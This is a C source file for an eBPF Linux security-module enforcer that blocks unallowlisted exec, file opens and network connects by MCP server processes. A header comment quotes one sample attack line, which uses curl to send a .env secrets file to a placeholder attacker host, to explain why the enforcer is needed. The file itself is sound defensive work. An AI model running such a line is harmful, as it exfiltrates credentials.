/* SPDX-License-Identifier: Apache-2.0 */
/*
 * AegisCPG -- in-kernel LSM enforcer
 *
 * Author: Pratham Kapoor <prathamkapoor027@gmail.com>
 * https://github.com/PrathamKapoor
 *
 * WHAT
 *   Three Linux LSM hooks that deny an MCP server's syscall *synchronously*,
 *   before the syscall has any effect:
 *     SEC("lsm/bprm_check_security")  deny execve of a non-allowlisted binary
 *     SEC("lsm/file_open")            deny open outside the permitted prefixes
 *     SEC("lsm/socket_connect")       deny connect outside the permitted CIDRs
 *   Each decision is written to a ring buffer for the loader and the portal.
 *
 * WHY
 *   A userspace supervisor polling /proc loses. In my measurements an attacker
 *   triggers exfiltration in a transient subshell:
 *
 *       subprocess.Popen(["sh", "-c", "curl -d @.env https://attacker.tld"])
 *
 *   which is alive for 1.8 ms. A 5 ms poll never observes it, so the exposure is
 *   100% and detection is 0%.
 *
 *   My first attempt hooked `syscall_trace` instead. It looked like it worked
 *   and it did not: `socket_connect`'s LSM hook runs with the handshake
 *   already been initiated, so filtering there blocked the *application* but not
 *   the *packet*. These are the real lsm/... sections, invoked by the security
 *   module framework before the syscall's side effects, which is what makes
 *   "denied" mean "did not happen".
 *
 * HOW
 *   The map layouts and the decision table here are mirrored exactly by
 *   crates/aegis-ebpf-loader/src/policy_compiler.rs. That Rust module is the
 *   reference implementation and its unit tests assert the decision table on
 *   every host; if the two ever diverge, the kernel would be enforcing a
 *   different policy than the tests claim. Divergence is impossible to see in a
 *   diff of two languages, so the decision table is *executed* two more ways
 *   and the verdicts are compared case by case:
 *     * natively: compile this file with -DAEGIS_USERSPACE_SHIM and run the
 *       real hooks as ordinary C on any host (ebpf-probes/aegis_userspace_shim.c,
 *       driven by crates/aegis-ebpf-loader/tests/shim_equivalence.rs);
 *     * in a VM: crates/aegis-ebpf-loader/src/bpf_vm.rs verifies and executes
 *       RFC 9669 BPF assembly implementing the same three decisions against
 *       the same compiled maps.
 *   The loader refuses to install a policy if any of the three disagree.
 *
 *   Executable identity: the kernel cannot hash a file inside an LSM hook and
 *   must not try -- hashing a binary in the exec path would destroy the latency
 *   the hook exists to provide. Userspace verifies each candidate's sha256
 *   against the TACR allowlist *before* the binary runs and registers the
 *   verified (cgroup, inode) pair in allowed_exec_inode_map; the hook then
 *   enforces membership. The Rust reference reaches the same verdict from the
 *   digest side; the registration step is the bridge, and the equivalence tests
 *   assert the verdicts agree case for case.
 *
 *   Requires Linux >= 5.7 with CONFIG_BPF_LSM=y and the kernel booted with
 *   `lsm=...,bpf`. See ebpf-probes/Dockerfile.ebpf-runner.
 */

#ifdef AEGIS_USERSPACE_SHIM
/*
 * Native userspace execution mode. aegis_shim.h provides freestanding
 * definitions of exactly the kernel facilities used below -- types, map
 * declarations, helper prototypes, context structures -- so the enforcement
 * logic in this file is compiled and executed as ordinary C on a host with no
 * BPF and no Linux. The hooks are not re-implemented there: this same text is
 * the code under test.
 */
#include "ebpf-shim/aegis_shim.h"
#else
#include <linux/bpf.h>
#include <linux/audit.h>
#include <linux/types.h>
#include <linux/fs.h>
#include <linux/sched.h>
#include <linux/if_ether.h>
#include <linux/socket.h>
#include <linux/net.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#endif

char LICENSE[] SEC("license") = "GPL";

/* Capability bits. These must match Capability::bit() in policy_compiler.rs. */
#define AEGIS_CAP_EXEC_BIT           (1u << 0)
#define AEGIS_CAP_NET_OUT_BIT        (1u << 1)
#define AEGIS_CAP_NET_IN_BIT         (1u << 2)
#define AEGIS_CAP_FILE_READ_BIT      (1u << 3)
#define AEGIS_CAP_FILE_WRITE_BIT     (1u << 4)

/* enforce_mode values. */
#define AEGIS_ENFORCE_ON             0
#define AEGIS_ENFORCE_OBSERVE_ONLY   1
#define AEGIS_ENFORCE_DISABLED       2

/* Hook codes, matching HookType::code(). */
#define AEGIS_HOOK_BPRM              1
#define AEGIS_HOOK_FILE_OPEN         2
#define AEGIS_HOOK_SOCKET_CONNECT    3

#define TASK_COMM_LEN 16
#define AEGIS_TARGET_LEN 128

/* Mirrors CgroupPolicyEntry. */
struct cgroup_policy {
    __u32 allow_bitmask;
    __u32 deny_bitmask;
    __u32 max_lattice_level;
    __u32 enforce_mode;
};

/* Mirrors LpmPrefix's value payload. */
struct path_policy {
    __u32 cgroup_id;
    __u32 allow;          /* 1 = allow, 0 = deny */
    __u32 reserved[2];
};

/* Mirrors KernelEvent / struct aegis_kernel_event. */
struct aegis_kernel_event {
    __u64 timestamp_ns;
    __u64 cgroup_id;
    __u32 pid;
    __u32 uid;
    __u32 hook_type;
    __s32 verdict;        /* 0 = ALLOW, -EPERM = DENY */
    __u64 latency_ns;
    char comm[TASK_COMM_LEN];
    char target[AEGIS_TARGET_LEN];
};

/*
 * LPM trie key.
 *
 * prefix_len is measured in BITS, not bytes. That distinction is load-bearing:
 * with a byte-granular key, a deny on "/workspace/.env" would also deny
 * "/workspace/.environment", and an allow on "/workspace/ab" could not be
 * distinguished from "/workspace/abc" at a sub-byte boundary.
 */
struct lpm_trie_key {
    __u32 prefix_len;
    __u8 data[0];
};

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 256);
    __type(key, __u64);                  /* bpf_get_current_cgroup_id() */
    __type(value, struct cgroup_policy);
} cgroup_policy_map SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_LPM_TRIE);
    __uint(max_entries, 4096);
    __uint(map_flags, BPF_F_NO_PREALLOC);
    __type(key, struct lpm_trie_key);
    __type(value, struct path_policy);
} allowed_path_lpm_map SEC(".maps");

/*
 * Trusted-executable registry: keyed by (cgroup_id, inode).
 *
 * The kernel cannot hash a file in the exec path, so the digest allowlist from
 * the TACR lives in userspace: before a binary may run, the loader verifies its
 * sha256 against allowed_exec_sha256 and registers the verified file's inode
 * here. Registering an inode whose digest is not allowlisted is refused on the
 * loader side, and a binary that was never verified simply has no entry -- the
 * hook below denies it. (An inode number can be recycled after an unlink; the
 * loader refreshes the registry on policy update, and this hook runs *before*
 * image replacement, so the race window is a policy refresh, not an exec.)
 */
struct exec_inode_key {
    __u64 cgroup_id;
    __u64 inode;
};

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, struct exec_inode_key);
    __type(value, __u8);
} allowed_exec_inode_map SEC(".maps");

/*
 * Egress allowlist, keyed by (cgroup_id, destination IPv4). Userspace inserts
 * one entry per address covered by an allowed CIDR, so the kernel does no
 * arithmetic in the hot path and there is exactly one implementation of CIDR
 * semantics -- the Rust one, which is unit tested.
 */
struct net_key {
    __u64 cgroup_id;
    __u32 addr;
    __u32 reserved;
};

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 4096);
    __type(key, struct net_key);
    __type(value, __u8);
} allowed_net_map SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 20);        /* 1 MiB, power of two */
} audit_ringbuf SEC(".maps");

static __always_inline struct cgroup_policy *lookup_policy(__u64 cg)
{
    return bpf_map_lookup_elem(&cgroup_policy_map, &cg);
}

static __always_inline int policy_active(const struct cgroup_policy *p)
{
    return p && p->enforce_mode == AEGIS_ENFORCE_ON;
}

/*
 * Longest-prefix lookup over the LPM trie.
 *
 * BPF_MAP_TYPE_LPM_TRIE returns the longest matching key itself, so this is a
 * single lookup rather than a walk -- and the longest-match rule is therefore
 * enforced by the map type rather than by hand, which is why the Rust simulator
 * has to reproduce it explicitly.
 * The key is built on the stack rather than cast from the path pointer: the
 * trie key is [ __u32 prefix_len_in_bits ][ path bytes ], and constructing it
 * explicitly is both bounds-checked and acceptable to the verifier, whereas a
 * cast from a variable-length pointer is not.
 */
static __always_inline struct path_policy *lookup_path_bytes(const char *path,
                                                            __u32 path_len)
{
    struct {
        struct lpm_trie_key hdr;
        __u8 data[AEGIS_TARGET_LEN];
    } key = {0};

    if (path_len == 0 || path_len > AEGIS_TARGET_LEN)
        return NULL;

    key.hdr.prefix_len = path_len * 8;
    __builtin_memcpy(key.data, path, path_len);

    return bpf_map_lookup_elem(&allowed_path_lpm_map, &key);
}

static __always_inline void emit(__u32 hook, __s32 verdict, __u64 cg,
                                 const char *target, __u64 latency_ns)
{
    struct aegis_kernel_event *ev;

    ev = bpf_ringbuf_reserve(&audit_ringbuf, sizeof(*ev), 0);
    if (!ev)
        return;

    ev->timestamp_ns = bpf_ktime_get_ns();
    ev->cgroup_id = cg;
    ev->pid = bpf_get_current_pid_tgid() >> 32;
    ev->uid = bpf_get_current_uid_gid();
    ev->hook_type = hook;
    ev->verdict = verdict;
    ev->latency_ns = latency_ns;

    bpf_get_current_comm(&ev->comm, sizeof(ev->comm));
    if (target) {
        __u32 n = 0;
        while (n < AEGIS_TARGET_LEN - 1 && target[n]) {
            ev->target[n] = target[n];
            n++;
        }
        ev->target[n] = '\0';
    }

    bpf_ringbuf_submit(ev, 0);
}

/* ------------------------------------------------------------------ */
/* LSM/bprm_check_security -- binary execution                          */
/* ------------------------------------------------------------------ */
SEC("lsm/bprm_check_security")
int BPF_PROG(aegis_bprm_check_security, struct linux_binprm *bprm)
{
    struct cgroup_policy *pol;
    struct exec_inode_key key = {0};
    __u8 *registered = NULL;
    __u64 cg = bpf_get_current_cgroup_id();
    __u64 t0, latency;

    t0 = bpf_ktime_get_ns();
    pol = lookup_policy(cg);

    /*
     * Identity check first: only a binary whose digest userspace verified
     * against the TACR allowlist has a registered inode (see the registry's
     * comment). Everything else is denied regardless of the capability bit.
     */
    if (bprm->file) {
        key.cgroup_id = cg;
        key.inode = bprm->file->f_inode->i_ino;
        registered = bpf_map_lookup_elem(&allowed_exec_inode_map, &key);
    }

    if (policy_active(pol) && (pol->allow_bitmask & AEGIS_CAP_EXEC_BIT) &&
        !(pol->deny_bitmask & AEGIS_CAP_EXEC_BIT) && registered) {
        latency = bpf_ktime_get_ns() - t0;
        emit(AEGIS_HOOK_BPRM, 0, cg, "exec", latency);
        return 0;
    }

    latency = bpf_ktime_get_ns() - t0;
    emit(AEGIS_HOOK_BPRM, -EPERM, cg, "exec", latency);
    /* Returned BEFORE the process image is replaced: not one instruction
     * of the attacker binary has executed. */
    return -EPERM;
}

/* ------------------------------------------------------------------ */
/* LSM/file_open -- filesystem access                                   */
/* ------------------------------------------------------------------ */
SEC("lsm/file_open")
int BPF_PROG(aegis_file_open, struct file *file)
{
    struct cgroup_policy *pol;
    struct path_policy *pp;
    __u64 cg = bpf_get_current_cgroup_id();
    __u64 t0, latency;
    __u32 path_len = 0;
    __u32 wanted;
    char path[AEGIS_TARGET_LEN];
    long err;

    t0 = bpf_ktime_get_ns();
    pol = lookup_policy(cg);

    /* Fail closed without an active policy: an unmanaged cgroup reads and
     * writes nothing, exactly as it executes nothing. The Rust reference
     * returns DenyEperm for a missing entry on every hook. */
    if (!policy_active(pol)) {
        emit(AEGIS_HOOK_FILE_OPEN, -EPERM, cg, "no-policy", 0);
        return -EPERM;
    }

    err = bpf_d_path(&file->f_path, path, sizeof(path));
    if (err <= 0) {
        /* A path that cannot be resolved cannot be matched against the prefix
         * allowlist: failure to decide is a denial, never an allow. */
        emit(AEGIS_HOOK_FILE_OPEN, -EPERM, cg, "path-unresolved", 0);
        return -EPERM;
    }
    path_len = (__u32)err;

    /* Read vs write comes from the open mode, so a read-granted tool cannot
     * write even inside an allowed prefix. Deny wins over allow, matching
     * CgroupPolicyEntry::permits in the Rust reference. */
    if ((file->f_flags & O_WRONLY) || (file->f_flags & O_RDWR))
        wanted = AEGIS_CAP_FILE_WRITE_BIT;
    else
        wanted = AEGIS_CAP_FILE_READ_BIT;
    if ((pol->deny_bitmask & wanted) || !(pol->allow_bitmask & wanted)) {
        emit(AEGIS_HOOK_FILE_OPEN, -EPERM, cg, path, 0);
        return -EPERM;
    }

    pp = lookup_path_bytes(path, path_len);

    /* Default deny. A path with no matching prefix is outside every granted
     * directory, and allowing it would make the allowlist meaningless. The
     * trie returns the longest stored prefix, so a deny entry nested under an
     * allowed directory wins; the value's cgroup_id check is what keeps one
     * cgroup's entries from deciding another cgroup's opens, since all
     * prefixes share one trie. */
    if (pp && pp->allow && pp->cgroup_id == cg) {
        latency = bpf_ktime_get_ns() - t0;
        emit(AEGIS_HOOK_FILE_OPEN, 0, cg, path, latency);
        return 0;
    }

    latency = bpf_ktime_get_ns() - t0;
    emit(AEGIS_HOOK_FILE_OPEN, -EPERM, cg, path, latency);
    return -EPERM;
}

/* ------------------------------------------------------------------ */
/* LSM/socket_connect -- egress                                        */
/* ------------------------------------------------------------------ */
SEC("lsm/socket_connect")
int BPF_PROG(aegis_socket_connect, struct socket *sock, struct sockaddr *address,
             int address_len)
{
    struct cgroup_policy *pol;
    struct net_key key = {0};
    __u64 cg = bpf_get_current_cgroup_id();
    __u64 t0, latency;
    __u8 *allowed;

    t0 = bpf_ktime_get_ns();
    pol = lookup_policy(cg);

    /* Family must be checked before casting: reading a sockaddr_in6 as a
     * sockaddr_in would produce a nonsense address and could match an allowed
     * entry. Fail closed on any family we do not understand -- an address the
     * policy cannot name is an address it does not permit, which is the same
     * verdict the Rust reference reaches when an address literal will not
     * parse as IPv4. */
    if (address->sa_family != 2 /* AF_INET */) {
        emit(AEGIS_HOOK_SOCKET_CONNECT, -EPERM, cg, "non-ipv4", 0);
        return -EPERM;
    }

    if (!policy_active(pol)) {
        emit(AEGIS_HOOK_SOCKET_CONNECT, -EPERM, cg, "no-policy", 0);
        return -EPERM;
    }
    if (!(pol->allow_bitmask & AEGIS_CAP_NET_OUT_BIT) ||
        (pol->deny_bitmask & AEGIS_CAP_NET_OUT_BIT)) {
        emit(AEGIS_HOOK_SOCKET_CONNECT, -EPERM, cg, "egress-denied", 0);
        return -EPERM;
    }

    key.cgroup_id = cg;
    key.addr = ((struct sockaddr_in *)address)->sin_addr.s_addr;
    allowed = bpf_map_lookup_elem(&allowed_net_map, &key);

    if (allowed) {
        latency = bpf_ktime_get_ns() - t0;
        emit(AEGIS_HOOK_SOCKET_CONNECT, 0, cg, "", latency);
        return 0;
    }

    latency = bpf_ktime_get_ns() - t0;
    emit(AEGIS_HOOK_SOCKET_CONNECT, -EPERM, cg, "egress-denied", latency);
    return -EPERM;
}
